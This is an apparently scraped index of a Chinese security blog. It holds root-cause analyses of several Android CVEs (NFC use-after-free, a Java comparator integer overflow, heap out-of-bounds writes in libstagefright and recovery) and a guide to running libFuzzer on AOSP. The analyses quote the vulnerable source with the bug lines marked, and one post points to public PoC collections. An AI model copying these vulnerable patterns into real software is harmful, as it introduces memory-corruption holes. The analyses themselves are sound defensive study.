Writer thread function ** ** Returns None ** *******************************************************************************/ static void* phTmlNfc_TmlThread(void* pParam) { NFCSTATUS wStatus = NFCSTATUS_SUCCESS; int32_t dwNoBytesWrRd = PH_TMLNFC_RESET_VALUE; uint8_t temp[260]; uint8_t readRetryDelay = 0; /* Transaction info buffer to be passed to Callback Thread */ static phTmlNfc_TransactInfo_t tTransactionInfo; /* Structure containing Tml callback function and parameters to be invoked by the callback thread */ static phLibNfc_DeferredCall_t tDeferredInfo; /* Initialize Message structure to post message onto Callback Thread */ static phLibNfc_Message_t tMsg; UNUSED(pParam); NXPLOG_TML_D(&quot;PN54X - Tml Reader Thread Started................\\n&quot;); /* Writer thread loop shall be running till shutdown is invoked */ while (gpphTmlNfc_Context-&gt;bThreadDone) { /* If Tml write is requested */ /* Set the variable to success initially */ wStatus = NFCSTATUS_SUCCESS; sem_wait(&amp;gpphTmlNfc_Context-&gt;rxSemaphore); /* If Tml read is requested */ if (1 == gpphTmlNfc_Context-&gt;tReadInfo.bEnable) { NXPLOG_TML_D(&quot;PN54X - Read requested.....\\n&quot;); /* Set the variable to success initially */ wStatus = NFCSTATUS_SUCCESS; /* Variable to fetch the actual number of bytes read */ dwNoBytesWrRd = PH_TMLNFC_RESET_VALUE; /* Read the data from the file onto the buffer */ if (NULL != gpphTmlNfc_Context-&gt;pDevHandle) { NXPLOG_TML_D(&quot;PN54X - Invoking I2C Read.....\\n&quot;); dwNoBytesWrRd = phTmlNfc_i2c_read(gpphTmlNfc_Context-&gt;pDevHandle, temp, 260); if (-1 == dwNoBytesWrRd) { NXPLOG_TML_E(&quot;PN54X - Error in I2C Read.....\\n&quot;); if (readRetryDelay &lt; MAX_READ_RETRY_DELAY_IN_MILLISEC) { /*sleep for 30/60/90/120/150 msec between each read trial incase of * read error*/ readRetryDelay += 30; } usleep(readRetryDelay * 1000); sem_post(&amp;gpphTmlNfc_Context-&gt;rxSemaphore); } else if (dwNoBytesWrRd &gt; 260) { NXPLOG_TML_E(&quot;Numer of bytes read exceeds the limit 260.....\\n&quot;); readRetryDelay = 0; sem_post(&amp;gpphTmlNfc_Context-&gt;rxSemaphore); } else { pthread_mutex_lock(&amp;gpphTmlNfc_Context-&gt;readInfoUpdateMutex); memcpy(gpphTmlNfc_Context-&gt;tReadInfo.pBuffer, temp, dwNoBytesWrRd); readRetryDelay = 0; NXPLOG_TML_D(&quot;PN54X - I2C Read successful.....\\n&quot;); /* This has to be reset only after a successful read */ gpphTmlNfc_Context-&gt;tReadInfo.bEnable = 0; if ((phTmlNfc_e_EnableRetrans == gpphTmlNfc_Context-&gt;eConfig) &amp;&amp; (0x00 != (gpphTmlNfc_Context-&gt;tReadInfo.pBuffer[0] &amp; 0xE0))) { NXPLOG_TML_D(&quot;PN54X - Retransmission timer stopped.....\\n&quot;); /* Stop Timer to prevent Retransmission */ uint32_t timerStatus = phOsalNfc_Timer_Stop(gpphTmlNfc_Context-&gt;dwTimerId); if (NFCSTATUS_SUCCESS != timerStatus) { NXPLOG_TML_E(&quot;PN54X - timer stopped returned failure.....\\n&quot;); } else { gpphTmlNfc_Context-&gt;bWriteCbInvoked = false; } } if (gpphTmlNfc_Context-&gt;tWriteInfo.bThreadBusy) { NXPLOG_TML_D(&quot;Delay Read if write thread is busy&quot;); usleep(2000); /*2ms delay to give prio to write complete */ } /* Update the actual number of bytes read including header */ gpphTmlNfc_Context-&gt;tReadInfo.wLength = (uint16_t)(dwNoBytesWrRd); phNxpNciHal_print_packet(&quot;RECV&quot;, gpphTmlNfc_Context-&gt;tReadInfo.pBuffer, gpphTmlNfc_Context-&gt;tReadInfo.wLength); dwNoBytesWrRd = PH_TMLNFC_RESET_VALUE; /* Fill the Transaction info structure to be passed to Callback * Function */ tTransactionInfo.wStatus = wStatus; tTransactionInfo.pBuff = gpphTmlNfc_Context-&gt;tReadInfo.pBuffer; /* Actual number of bytes read is filled in the structure */ tTransactionInfo.wLength = gpphTmlNfc_Context-&gt;tReadInfo.wLength; /* Read operation completed successfully. Post a Message onto Callback * Thread*/ /* Prepare the message to be posted on User thread */ tDeferredInfo.pCallback = &amp;phTmlNfc_ReadDeferredCb; tDeferredInfo.pParameter = &amp;tTransactionInfo; tMsg.eMsgType = PH_LIBNFC_DEFERREDCALL_MSG; tMsg.pMsgData = &amp;tDeferredInfo; tMsg.Size = sizeof(tDeferredInfo); pthread_mutex_unlock(&amp;gpphTmlNfc_Context-&gt;readInfoUpdateMutex); NXPLOG_TML_D(&quot;PN54X - Posting read message.....\\n&quot;); phTmlNfc_DeferredCall(gpphTmlNfc_Context-&gt;dwCallbackThreadId, &amp;tMsg); } } else { NXPLOG_TML_D(&quot;PN54X -gpphTmlNfc_Context-&gt;pDevHandle is NULL&quot;); } } else { NXPLOG_TML_D(&quot;PN54X - read request NOT enabled&quot;); usleep(10 * 1000); } } /* End of While loop */ return NULL; } ","link":"https://lzxzl.github.io/post/cve-2021-39629-nfc-uaf/"},{"title":"CVE-2021-39659 - telecom - Java整数溢出","content":" 2023.09.06 CVE-2021-39659 A-208267659 DoS 高 10、11、12 patch Fix sorting issue during emergency call attempt. Fix the integer overflow/underflow caused by sorting of duplicate phoneaccounts during emergency call attempt. 分析 是我孤陋寡闻了，以前没注意过Java还会整数溢出： Java的int是32位有符号整数类型，其最大值是0x7fffffff,最小值则是0x80000000，和C语言一样。即int表示的数的范围是-2147483648 ～ 2147483647之间。 下面的代码会根据package、label和hashcode等进行排序，但是在根据hashcode排序的时候，直接返回account1.hashCode() - account2.hashCode() ，这就可能导致整数上溢/下溢，从而导致排序出错。 // hashCode 返回的是int类型的值 public int hashCode() 比如： account1.hashCode() &lt; account2.hashCode() ，但是两者相减可能导致整数下溢，返回正数（表示前者大于后者，与真实情况不符） 极端情况举例：Integer.MIN_VALUE - 1 == 2147483647 account1.hashCode() &gt; account2.hashCode() ，但是两者相加可能导致整数上溢，返回负数（表示前者小于后者，与真实情况不符） 极端情况举例：Integer.MAX_VALUE + 1 == -2147483648 public void sortSimPhoneAccountsForEmergency(List&lt;PhoneAccount&gt; accounts, PhoneAccount userPreferredAccount) { // Sort the accounts according to how we want to display them (ascending order). accounts.sort((account1, account2) -&gt; { ...... // Then order by package String pkg1 = account1.getAccountHandle().getComponentName().getPackageName(); String pkg2 = account2.getAccountHandle().getComponentName().getPackageName(); retval = pkg1.compareTo(pkg2); if (retval != 0) { return retval; } // then order by label String label1 = nullToEmpty(account1.getLabel().toString()); String label2 = nullToEmpty(account2.getLabel().toString()); retval = label1.compareTo(label2); if (retval != 0) { return retval; } // then by hashcode return account1.hashCode() - account2.hashCode(); // 漏洞点 }); } private static String nullToEmpty(String str) { return str == null ? &quot;&quot; : str; } } ","link":"https://lzxzl.github.io/post/cve-2021-39659-telecom-java-zheng-shu-yi-chu/"},{"title":"CVE-2021-39623 - media - libstagefright - heap OOB Write","content":" 2023.09.05 CVE-2021-39623 A-194105348 EoP 高 9、10、11、12 patch SimpleDecodingSource:Prevent OOB write in heap mem doRead() doesn't handle situations when received byte do not fit into input buffer in case of vorbis audio compression. It results in OOB write in heap memory right after the allocated input buffer. Added code to copy kKeyValidSamples only if there was enough space. Otherwise, print a warning log. 若cpLen = in_buffer-&gt;capacity()，那么在后面的 vorbis 音频压缩的场景下，in_buffer没有空间再用于拷贝kKeyValidSamples（numPageSamples）的值了，于是，发生越界写4个字节。 修复方式：添加了仅在有足够空间时复制 kKeyValidSamples 的代码。 否则，打印警告日志。 Bug: 194105348 Test: post-submit media cts tests 分析 // frameworks/av/media/libstagefright/SimpleDecodingSource.cpp // 这段代码是一个音视频解码器的读取函数， // 主要功能是从输入源读取数据并进行解码。 status_t SimpleDecodingSource::doRead( Mutexed&lt;ProtectedState&gt;::Locked &amp;me, MediaBufferBase **buffer, const ReadOptions *options) { // |me| is always locked on entry, but is allowed to be unlocked on exit // 【1】首先检查当前状态是否是STARTED状态，如果不是则返回错误。 CHECK_EQ(me-&gt;mState, STARTED); size_t out_ix, in_ix, out_offset, out_size; int64_t out_pts; uint32_t out_flags; status_t res; // flush codec on seek // 【2】如果传入的options参数不为空，且包含seek操作，那么在进行seek操作前需要先flush解码器。 MediaSource::ReadOptions::SeekMode mode; if (options != NULL &amp;&amp; options-&gt;getSeekTo(&amp;out_pts, &amp;mode)) { me-&gt;mQueuedInputEOS = false; me-&gt;mGotOutputEOS = false; mCodec-&gt;flush(); } // 【3】如果已经获取到了输出的EOS（End of Stream）标志，说明已经读取到了输入源的末尾，直接返回ERROR_END_OF_STREAM。 if (me-&gt;mGotOutputEOS) { return ERROR_END_OF_STREAM; } // 【4】进入一个循环，最多重试kTimeoutMaxRetries次。 for (int retries = 0; retries &lt; kTimeoutMaxRetries; ++retries) { // If we fill all available input buffers, we should expect that // the codec produces at least one output buffer. Also, the codec // should produce an output buffer in at most 1 seconds. Retry a // few times nonetheless. // 【4.1】首先判断是否还有可用的输入缓冲区。如果没有则退出循环。 while (!me-&gt;mQueuedInputEOS) { // allow some time to get input buffer after flush // 【4.2】获取一个可用的输入缓冲区in_buffer，并将输入数据读取到该缓冲区in_buffer中。 res = mCodec-&gt;dequeueInputBuffer(&amp;in_ix, kTimeoutWaitForInputUs); if (res == -EAGAIN) { // no available input buffers break; } sp&lt;MediaCodecBuffer&gt; in_buffer; if (res == OK) { // 调用 mCodec 对象的 getInputBuffer 方法来获取指定索引的输入缓冲区，并将其地址存储在 in_buffer 变量中 res = mCodec-&gt;getInputBuffer(in_ix, &amp;in_buffer); } // 【4.3】如果读取失败，将状态设置为ERROR并返回UNKNOWN_ERROR。 if (res != OK || in_buffer == NULL) { ALOGW(&quot;[%s] could not get input buffer #%zu&quot;, mComponentName.c_str(), in_ix); me-&gt;mState = ERROR; return UNKNOWN_ERROR; } // 【4.4】如果读取成功，将读取到的数据拷贝到解码器的输入缓冲区in_buf中， // 并将输入缓冲区提交给解码器进行解码。 MediaBufferBase *in_buf; while (true) { in_buf = NULL; me.unlock(); res = mSource-&gt;read(&amp;in_buf, options); me.lock(); if (res != OK || me-&gt;mState != STARTED) { if (in_buf != NULL) { in_buf-&gt;release(); in_buf = NULL; } // queue EOS me-&gt;mQueuedInputEOS = true; if (mCodec-&gt;queueInputBuffer( in_ix, 0 /* offset */, 0 /* size */, 0 /* pts */, MediaCodec::BUFFER_FLAG_EOS) != OK) { ALOGI(&quot;[%s] failed to queue input EOS&quot;, mComponentName.c_str()); me-&gt;mState = ERROR; return UNKNOWN_ERROR; } // don't stop on EOS, but report error or EOS on stop if (res != ERROR_END_OF_STREAM) { me-&gt;mState = ERROR; return res; } if (me-&gt;mState != STARTED) { return ERROR_END_OF_STREAM; } break; } if (in_buf == NULL) { // should not happen continue; } else if (in_buf-&gt;range_length() != 0) { break; } in_buf-&gt;release(); } // 判断 in_buf 是否为 NULL。如果不为 NULL，继续执行下面的逻辑。 if (in_buf != NULL) { // 使用 meta_data() 方法从in_buf的元数据中查找名为 kKeyTime 的整数值，并将其存储在 timestampUs 变量中 int64_t timestampUs = 0; CHECK(in_buf-&gt;meta_data().findInt64(kKeyTime, &amp;timestampUs)); // 判断in_buf的有效数据长度（range_length()）加上特定条件（如果是 Vorbis 格式，再加上 4 字节）是否超过了in_buffer的容量（capacity()）。 // 如果超过了容量，代码会打印一个警告信息。 if (in_buf-&gt;range_length() + (mIsVorbis ? 4 : 0) &gt; in_buffer-&gt;capacity()) { ALOGW(&quot;'%s' received %zu input bytes for buffer of size %zu&quot;, mComponentName.c_str(), in_buf-&gt;range_length() + (mIsVorbis ? 4 : 0), in_buffer-&gt;capacity()); } // 计算需要拷贝的数据长度 cpLen，取in_buf的有效数据长度和in_buffer的容量 这两者中的较小者 size_t cpLen = min(in_buf-&gt;range_length(), in_buffer-&gt;capacity()); // 【漏洞分析1】 cpLen是这两者中的最小者，如果cpLen = in_buffer-&gt;capacity() // 将 in_buf 的数据拷贝到in_buffer 的基地址处，拷贝的数据长度为 cpLen 字节 memcpy(in_buffer-&gt;base(), (uint8_t *)in_buf-&gt;data() + in_buf-&gt;range_offset(), cpLen ); // 如果输入缓冲区是 Vorbis 格式，代码会继续执行下面的逻辑。 if (mIsVorbis) { int32_t numPageSamples; // 使用 in_buf 对象的 meta_data() 方法来获取in_buf的元数据，并从中查找名为 kKeyValidSamples 的整数值，并将其存储在 numPageSamples 变量中 if (!in_buf-&gt;meta_data().findInt32(kKeyValidSamples, &amp;numPageSamples)) { // 如果找不到该键值，则将 numPageSamples 设置为 -1。 numPageSamples = -1; } // dest：in_buffer-&gt;base() + cpLen 表达式表示输入缓冲区的基地址加上 cpLen，即获取到从 cpLen 位置开始的一段内存地址 // source：numPageSamples 变量的地址 // 复制的字节数为 sizeof(numPageSamples) //【漏洞分析2】如果cpLen = in_buffer-&gt;capacity()，那么此时in_buffer-&gt;base() + cpLen已经指向in_buffer的末尾了 // 那么也就是没有空间再用于拷贝kKeyValidSamples（numPageSamples）的值了。 // 此时就会发生OOB Write memcpy(in_buffer-&gt;base() + cpLen, &amp;numPageSamples, sizeof(numPageSamples)); // 【漏洞点】OOB Write } // 调用 mCodec 对象的 queueInputBuffer 方法将输入缓冲区 in_buf 排队到编解码器中。 // 传递给该方法的参数包括输入缓冲区的索引 in_ix、偏移量 offset、长度（输入缓冲区的有效数据长度加上特定条件）和时间戳 timestampUs。 res = mCodec-&gt;queueInputBuffer( in_ix, 0 /* offset */, in_buf-&gt;range_length() + (mIsVorbis ? 4 : 0), timestampUs, 0 /* flags */); // 检查 queueInputBuffer 方法的返回值 res 是否为 OK。 // 如果不为 OK，代码会打印一个信息，并将当前状态设为 ERROR。 if (res != OK) { ALOGI(&quot;[%s] failed to queue input buffer #%zu&quot;, mComponentName.c_str(), in_ix); me-&gt;mState = ERROR; } // 调用输入缓冲区的 release 方法释放该缓冲区。 in_buf-&gt;release(); } } // 【4.5】解码器进行解码后，将解码后的数据放入输出缓冲区中。 me.unlock(); res = mCodec-&gt;dequeueOutputBuffer( &amp;out_ix, &amp;out_offset, &amp;out_size, &amp;out_pts, &amp;out_flags, kTimeoutWaitForOutputUs /* timeoutUs */); me.lock(); // abort read on stop if (me-&gt;mState != STARTED) { if (res == OK) { mCodec-&gt;releaseOutputBuffer(out_ix); } return ERROR_END_OF_STREAM; } if (res == -EAGAIN) { ALOGD(&quot;[%s] did not produce an output buffer. retry count: %d&quot;, mComponentName.c_str(), retries); continue; } else if (res == INFO_FORMAT_CHANGED) { if (mCodec-&gt;getOutputFormat(&amp;me-&gt;mFormat) != OK) { me-&gt;mState = ERROR; res = UNKNOWN_ERROR; } return res; } else if (res == INFO_OUTPUT_BUFFERS_CHANGED) { ALOGV(&quot;output buffers changed&quot;); continue; } else if (res != OK) { me-&gt;mState = ERROR; return res; } sp&lt;MediaCodecBuffer&gt; out_buffer; res = mCodec-&gt;getOutputBuffer(out_ix, &amp;out_buffer); if (res != OK) { ALOGW(&quot;[%s] could not get output buffer #%zu&quot;, mComponentName.c_str(), out_ix); me-&gt;mState = ERROR; return UNKNOWN_ERROR; } // 【4.6】如果解码器输出的数据中包含EOS标志, if (out_flags &amp; MediaCodec::BUFFER_FLAG_EOS) { me-&gt;mGotOutputEOS = true;// 将状态设置为已获取到输出的EOS， // return EOS immediately if last buffer is empty if (out_size == 0) { mCodec-&gt;releaseOutputBuffer(out_ix); return ERROR_END_OF_STREAM; // 并立即返回ERROR_END_OF_STREAM（如果最后一个输出缓冲区为空）。 } } // 【4.7】如果使用的是Surface进行渲染，并且输出缓冲区中有数据 if (mUsingSurface &amp;&amp; out_size &gt; 0) { *buffer = new MediaBuffer(0);// 将输出缓冲区的大小设置为0， mCodec-&gt;renderOutputBufferAndRelease(out_ix);// 并调用解码器的renderOutputBufferAndRelease函数释放输出缓冲区。 } else { // 【4.8】如果不使用Surface进行渲染， // 将输出缓冲区的数据拷贝到新创建的MediaBuffer中 *buffer = new MediaBuffer(out_size); CHECK_LE(out_buffer-&gt;size(), (*buffer)-&gt;size()); memcpy((*buffer)-&gt;data(), out_buffer-&gt;data(), out_buffer-&gt;size()); // 并设置相关的元数据信息 (*buffer)-&gt;meta_data().setInt64(kKeyTime, out_pts); // 然后释放输出缓冲区。 mCodec-&gt;releaseOutputBuffer(out_ix); } return OK; // 【4.9】返回OK表示成功读取并解码一帧数据。 } return TIMED_OUT; // 【4.10】如果重试次数超过了kTimeoutMaxRetries，则返回TIMED_OUT表示超时。 } ","link":"https://lzxzl.github.io/post/cve-2021-39623-media-libstagefright-heap-oob-write/"},{"title":"CVE-2021-39632 - Recovery - 越界写","content":" 2023.09.04 CVE-2021-39632 A-202159709 EoP 高 11、12 patch Do not write past end of inotify event structure. 分析 patch之前的源码 // static int inotify_cb(int fd, __unused uint32_t epevents) { if (g_saved_input_cb == nullptr) return -1; // The inotify will put one or several complete events. // Should not read part of one event. int event_len_int; int ret = ioctl(fd, FIONREAD, &amp;event_len_int); // 获取event长度 if (ret != 0) return -1; if (event_len_int &lt; 0) return -1; size_t event_len = event_len_int; std::unique_ptr&lt;DIR, decltype(&amp;closedir)&gt; dir(opendir(INPUT_DEV_DIR), closedir); if (!dir) { return -1; } std::vector&lt;int8_t&gt; buf(event_len); // 从inotify文件描述符中读取 event 数据到 buf 中 ssize_t r = TEMP_FAILURE_RETRY(read(fd, buf.data(), event_len)); if (r != event_len) { return -1; } size_t offset = 0; // 【1】无符号数 offset = 0 // 循环处理inotify events while (offset &lt; event_len) { // 【2】buf里存储的是events，根据偏移offset来访问每个event，一开始指向buf.data()开头 struct inotify_event* pevent = reinterpret_cast&lt;struct inotify_event*&gt;(buf.data() + offset); // 【3】继续往下看之前，先看看inotify_event结构体： // 【3.1】name字段是inotify_event结构体最后一个字段，char型数组，也就是该event的名字 // 【3.2】len字段是inotify_event结构体倒数第二个字段，无符号32位，含义为name数组的长度 // 【5】offset表示之前已经处理过的event的长度，sizeof(inotify_event) + pevent-&gt;len表示此次要处理的event的长度 // 如果此次要处理的event的长度加上之前处理过的长度的结果，大于总长度，则error if (offset + sizeof(inotify_event) + pevent-&gt;len &gt; event_len) { // The pevent-&gt;len is too large and buffer will over flow. // In general, should not happen, just make more stable. return -1; } // 【4】每次增加的偏移offset的含义是结构体inotify_event的长度 + name的长度 offset += sizeof(inotify_event) + pevent-&gt;len; // 【6】将name字段末尾设置为\\0。当pevent-&gt;len等于buf剩余长度时，会越界写一个\\0。举例如下： // 假设name为event，即长度为5，那么： // 4B 4B 4B 4B 5B // | wd | mask | cookie | len | name | // 0 3 4 7 8 11 12 15 16 20 21 // pevent-&gt;name[pevent-&gt;len] =&gt; pevent-&gt;name[5] =&gt; pevent[21]， 越界写一个\\0 // 所以patch写的是不要在inotify event 结构体之后再写数据（Do not write past end of inotify event structure.） pevent-&gt;name[pevent-&gt;len] = '\\0'; if (strncmp(pevent-&gt;name, &quot;event&quot;, 5)) { continue; } android::base::unique_fd dfd(openat(dirfd(dir.get()), pevent-&gt;name, O_RDONLY)); if (dfd == -1) { break; } if (!should_add_input_device(dfd, g_allow_touch_inputs)) { continue; } // Only add, we assume the user will not plug out and plug in USB device again and again :) ev_add_fd(std::move(dfd), g_saved_input_cb); } return 0; } /* * struct inotify_event - structure read from the inotify device for each event * * When you are watching a directory, you will receive the filename for events * such as IN_CREATE, IN_DELETE, IN_OPEN, IN_CLOSE, ..., relative to the wd. */ struct inotify_event { __s32 wd; /* watch descriptor */ __u32 mask; /* watch mask */ __u32 cookie; /* cookie to synchronize two events */ __u32 len; /* length (including nulls) of name */ char name[]; /* stub for possible name */ }; 小结 以后注意这种在结构体之后写数据的代码：pevent-&gt;name[pevent-&gt;len] = '\\0'。 ","link":"https://lzxzl.github.io/post/new_cve-2021-39632-recovery-yue-jie-xie/"},{"title":"Android安全公告CVE分析 - 开篇&总览","content":"哎，挖不出洞愁啊。 今天是2023年9月6日，前两天各分析了一个Android安全公告里的CVE，今天继续，并打算一直保持下去，在公告里每天挑一个cve分析一下，贴到博客来监督自己。 每个CVE最少把漏洞根因搞懂吧。 已分析列表 2023/09/04 - CVE-2021-39632 - Recovery - 越界写 2023/09/05 - CVE-2021-39623 - media - libstagefright - heap OOB Write 2023/09/06 CVE-2021-39659 - telecom - Java整数溢出 2023/09/07 - CVE-2021-39629 - NFC - UAF 2023/09/08 - CVE-2021-39665 - libstagefright - OOB Read 2023/09/09 - CVE-2021-39675 - NFC - OOB Write 2023/09/10 - CVE-2021-39804 - libheif - 空指针解引用 2023/09/11 - CVE-2021-39703 - USB服务 - 逻辑漏洞 2023/09/12 - CVE-2021-39805 - 蓝牙L2CAP - OOB Read 2023/09/13 - CVE-2022-20344 - SurfaceFlinger - Race Condition Race Condition - pwn.college待做 2023/09/14 CVE-2022-20229 - 蓝牙HFP Client - 越界写 CVE-2022-20224 - 蓝牙HFP Client - 越界读 HFP待分析 2023/09/15 - CVE-2022-20445 - 蓝牙SDP - 整数溢出 整数溢出导致堆越界读，整数溢出明白了，但是堆越界读没搞懂。。 2023/09/16 - CVE-2022-20395 - MediaProvider - 路径穿越 2023/09/17 - CVE-2022-20410 - 蓝牙 - 整数溢出-&gt;OOB Read 2023/09/18 = CVE-2022-20447 - 蓝牙PAN - UAF 搜集的资料 在github上找到几个Android cve的PoC集合： ● https://github.com/derrekr/android_security ● https://github.com/flankerhqd/vendor-android-cves ● https://github.com/ScottyBauer/Android_Kernel_CVE_POCs ","link":"https://lzxzl.github.io/post/android-an-quan-gong-gao-cve-fen-xi-kai-pian/"},{"title":"AOSP上的libfuzzer尝试","content":"这篇主要是记录根据Google官方文档 通过 libFuzzer 进行模糊测试 来尝试在AOSP上使用libfuzzer的记录 0 环境准备 设备：Pixel 4 aosp源码：android-13.0.0_r7（这个源码是之前就下载好了的，所以我这里就不去下载main/master分支的了） 下面命令中的驱动程序二进制文件可以根据自己的手机环境下载相应的文件。 mkdir ~/bin export PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo chmod a+x ~/bin/repo repo init -u https://android.googlesource.com/platform/manifest -b android-13.0.0_r7 repo sync -c -j8 wget https://dl.google.com/dl/android/aosp/google_devices-flame-tp1a.221005.002.b2-22399ead.tgz tar xvf google_devices-flame-tp1a.221005.002.b2-22399ead.tgz ./extract-google_devices-flame.sh wget https://dl.google.com/dl/android/aosp/qcom-flame-tp1a.221005.002.b2-358af558.tgz tar xvf qcom-flame-tp1a.221005.002.b2-358af558.tgz ./extract-qcom-flame.sh . build/envsetup.sh lunch 注意：lunch命令中选择相应的选项，我这里是flame。选择相应选项后，会设置一些环境变量。 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ lunch You're building on Linux Lunch menu .. Here are the common combinations: 1. aosp_arm-eng 2. aosp_arm64-eng ...... 22. aosp_flame-userdebug 23. aosp_flame_car-userdebug ...... Which would you like? [aosp_arm-eng] Pick from common choices above (e.g. 13) or specify your own (e.g. aosp_barbet-eng): 22 Hint: next time you can simply run 'lunch aosp_flame-userdebug' ============================================ PLATFORM_VERSION_CODENAME=REL PLATFORM_VERSION=13 TARGET_PRODUCT=aosp_flame TARGET_BUILD_VARIANT=userdebug TARGET_BUILD_TYPE=release TARGET_ARCH=arm64 TARGET_ARCH_VARIANT=armv8-a TARGET_CPU_VARIANT=generic TARGET_2ND_ARCH=arm TARGET_2ND_ARCH_VARIANT=armv8-a TARGET_2ND_CPU_VARIANT=generic HOST_ARCH=x86_64 HOST_2ND_ARCH=x86 HOST_OS=linux HOST_OS_EXTRA=Linux-5.19.0-46-generic-x86_64-Ubuntu-22.04.2-LTS HOST_CROSS_OS=windows HOST_CROSS_ARCH=x86 HOST_CROSS_2ND_ARCH=x86_64 HOST_BUILD_TYPE=release BUILD_ID=TP1A.221005.002 OUT_DIR=out PRODUCT_SOONG_NAMESPACES=hardware/google/av hardware/google/camera hardware/google/interfaces hardware/google/pixel device/google/coral hardware/qcom/sm8150/display hardware/qcom/sm8150/data/ipacfg-mgr hardware/qcom/sm8150/gps vendor/google/airbrush/floral vendor/google/biometrics/face/florence vendor/google/camera vendor/google/darwinn vendor/google_devices/common/proprietary/confirmatioui_hal vendor/google_nos/host/android vendor/qcom/sm8150 vendor/qcom/sm8150/proprietary/commonsys/telephony-apps/DataStatusNotification vendor/qcom/sm8150/proprietary/gps vendor/qcom/sm8150/proprietary/qmi vendor/qcom/sm8150/codeaurora/location vendor/google/interfaces vendor/google_nos/test/system-test-harness vendor/qcom/sensors vendor/google/tools/sensors vendor/qcom/sm7250/codeaurora/commonsys/telephony/ims/ims-ext-common vendor/qcom/sm7250/codeaurora/dataservices/rmnetctl vendor/qcom/sm7250/proprietary/commonsys/qcrilOemHook vendor/qcom/sm7250/proprietary/commonsys/telephony-apps/ims vendor/qcom/sm7250/proprietary/commonsys/telephony-apps/QtiTelephonyService vendor/qcom/sm7250/proprietary/commonsys/telephony-apps/xdivert vendor/qcom/sm7250/proprietary/qcril-data-hal vendor/qcom/sm7250/proprietary/qcril-hal vendor/qcom/sm7250/proprietary/data vendor/qcom/proprietary/bluetooth/hidl_client vendor/qcom/flame/proprietary ============================================ 1 编译并刷入镜像 # 编译/构建 m # 进入fastboot模式 adb reboot bootloader # fastboot命令查看设备，确认fastboot命令是否能正常使用 fastboot device # 解锁引导加载程序（如果之前就解锁过，不执行该条命令也可以） fastboot oem unlock # 刷入新编译的映像 fastboot flashall 探索1：fastboot device报错无权限 如果fastboot device报错如下： ztree@ubuntu2:~/aosp/android-13.0.0_r7$ fastboot devices no permissions (missing udev rules? user is in the plugdev group); see [http://developer.android.com/tools/device.html] fastboot 解决办法如下： # 查看usb设备信息，可以看到idVendor是18d1，idProduct是4ee0 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ lsusb Bus 004 Device 004: ID 18d1:4ee0 Google Inc. Nexus/Pixel Device (fastboot) Bus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub Bus 003 Device 003: ID 0489:e0cd Foxconn / Hon Hai Wireless_Device Bus 003 Device 002: ID 04f3:0c4b Elan Microelectronics Corp. ELAN:Fingerprint Bus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub Bus 001 Device 003: ID 5986:212b Acer, Inc Integrated Camera Bus 001 Device 002: ID 046d:c542 Logitech, Inc. Wireless Receiver Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub # 查看之前为解决adb device报错无权限而添加的规则文件 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ sudo cat /etc/udev/rules.d/90-android.rules SUBSYSTEM==&quot;usb&quot;,ATTRS{idVendor}==&quot;18d1&quot;,ATTRS{idProduct}==&quot;4ee7&quot;,MODE=&quot;0666&quot;,GROUP=&quot;plugdev&quot;,SYMLINK+=&quot;android&quot;,SYMLINK+=&quot;android_adb&quot; # 复制一份，命名为91-android.rules ztree@ubuntu2:~/aosp/android-13.0.0_r7$ sudo cp /etc/udev/rules.d/90-android.rules /etc/udev/rules.d/91-android.rules # 编辑新规则文件，idVendor仍然是18d1，修改idProduct为4ee0 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ sudo vim /etc/udev/rules.d/91-android.rules # 刷新规则，重启udev服务 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ sudo udevadm control --reload-rules ztree@ubuntu2:~/aosp/android-13.0.0_r7$ sudo service udev restart ztree@ubuntu2:~/aosp/android-13.0.0_r7$ sudo udevadm trigger # 再次尝试fastboot device，成功 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ fastboot devices 9B081FFAZ0052M fastboot 如果是adb遇到了这个错误，还要重启adb。 探索2： fastboot flashall 是怎么刷镜像的？ ztree@ubuntu2:~/aosp/android-13.0.0_r7$ fastboot --help usage: fastboot [OPTION...] COMMAND... flashing: ...... flashall Flash all partitions from $ANDROID_PRODUCT_OUT. On A/B devices, flashed slot is set as active. Secondary images may be flashed to inactive slot. 可以看到flashall选项是将环境变量$ANDROID_PRODUCT_OUT中的内容刷到设备中，而该环境变量是在执行. build/envsetup.sh和lunch命令的时候，根据选择的选项而设置的。 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ echo $ANDROID_PRODUCT_OUT /home/ztree/aosp/android-13.0.0_r7/out/target/product/flame 2 编译一个Google自有的libfuzzer脚本（手机） 先尝试在手机上跑libfuzzer，因为有些模块会不支持在host上编译和运行 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ SANITIZE_TARGET=hwaddress m metadataretriever_fuzzer ...... [100% 595/595] Install out/target/product/flame/system/lib64/libstagefright.so #### build completed successfully (03:08 (mm:ss)) #### 这个fuzzer是在 frameworks/av/media/libmediaplayerservice/fuzzer/Android.bp 中定义的，也可以从这里查看。 3 运行（手机） # 手机进入root模式 ztree@ubuntu2:~/aosp/android-13.0.0_r7$ adb root # 同步更新data目录下的文件到手机（主要是把data/fuzz目录同步到手机上去，该目录包含fuzzer和一些库文件） ztree@ubuntu2:~/aosp/android-13.0.0_r7$ adb sync data /data/: 140 files pushed, 0 skipped. 278.6 MB/s (353442745 bytes in 1.210s) # 进入手机shell，执行libfuzzer ztree@ubuntu2:~/aosp/android-13.0.0_r7$ adb shell flame:/ # cd /data/fuzz/ flame:/data/fuzz # ls arm64 flame:/data/fuzz # cd arm64/ flame:/data/fuzz/arm64 # ls lib metadataretriever_fuzzer flame:/data/fuzz/arm64 # cd metadataretriever_fuzzer/ flame:/data/fuzz/arm64/metadataretriever_fuzzer # ls config.json metadataretriever_fuzzer 1|flame:/data/fuzz/arm64/metadataretriever_fuzzer # mkdir corpus flame:/data/fuzz/arm64/metadataretriever_fuzzer # ./metadataretriever_fuzzer ./corpus/ INFO: Running with entropic power schedule (0xFF, 100). INFO: Seed: 3179219735 ...... INFO: 0 